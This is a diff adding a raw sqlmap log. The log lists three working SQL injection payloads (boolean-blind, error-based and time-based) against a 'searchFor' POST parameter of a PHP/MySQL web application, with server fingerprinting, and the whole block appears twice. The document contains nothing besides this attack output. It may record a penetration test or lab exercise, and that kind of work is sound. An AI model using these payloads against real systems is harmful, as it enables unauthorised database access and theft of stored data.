@@ -1,0 +1,36 @@
+sqlmap identified the following injection point(s) with a total of 769 HTTP(s) requests:
+---
+Parameter: searchFor (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchFor=WmmA' AND EXTRACTVALUE(6689,CASE WHEN (6689=6689) THEN 6689 ELSE 0x3A END) AND 'yYSz'='yYSz&goButton=go
+
+    Type: error-based
+    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+    Payload: searchFor=WmmA' OR GTID_SUBSET(CONCAT(0x7178626b71,(SELECT (ELT(6784=6784,1))),0x7162767871),6784) AND 'faru'='faru&goButton=go
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchFor=WmmA' AND (SELECT 6334 FROM (SELECT(SLEEP(5)))WoQI) AND 'cfAo'='cfAo&goButton=go
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchFor (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchFor=WmmA' AND EXTRACTVALUE(6689,CASE WHEN (6689=6689) THEN 6689 ELSE 0x3A END) AND 'yYSz'='yYSz&goButton=go
+
+    Type: error-based
+    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+    Payload: searchFor=WmmA' OR GTID_SUBSET(CONCAT(0x7178626b71,(SELECT (ELT(6784=6784,1))),0x7162767871),6784) AND 'faru'='faru&goButton=go
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchFor=WmmA' AND (SELECT 6334 FROM (SELECT(SLEEP(5)))WoQI) AND 'cfAo'='cfAo&goButton=go
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
